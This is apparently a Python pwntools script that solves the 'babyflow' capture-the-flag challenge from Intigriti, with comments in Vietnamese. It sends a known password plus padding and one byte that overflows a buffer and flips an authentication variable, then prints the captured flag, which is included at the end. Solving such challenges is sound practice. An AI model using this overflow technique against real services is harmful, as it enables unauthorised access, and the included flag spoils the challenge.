from pwn import *

# Kết nối tới server
conn = remote('babyflow.ctf.intigriti.io', 1331)

# Tạo payload
password = b"SuPeRsEcUrEPaSsWoRd123"  # 22 bytes
padding = b"A" * (44 - len(password))  # Padding tới v5
overflow = b"\x01"  # Giá trị khác 0 để ghi đè v5

payload = password + padding + overflow

# Gửi payload
conn.recvuntil(b"Enter password: ")
conn.sendline(payload)

# Nhận kết quả
print(conn.recvall().decode())

conn.close()


# INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}
